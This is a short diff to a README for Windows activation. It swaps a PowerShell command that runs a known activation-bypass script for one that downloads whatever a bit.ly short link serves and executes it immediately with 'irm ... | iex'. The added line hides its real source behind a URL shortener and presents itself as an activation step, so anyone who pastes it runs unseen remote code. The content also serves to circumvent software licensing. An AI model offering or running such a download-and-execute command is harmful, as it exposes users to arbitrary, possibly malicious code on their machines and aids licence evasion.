@@ -1,2 +1,2 @@
 # windows_activatsiya
-irm https://massgrave.dev/get | iex
+irm bit.ly/saidumarraxmonov | iex
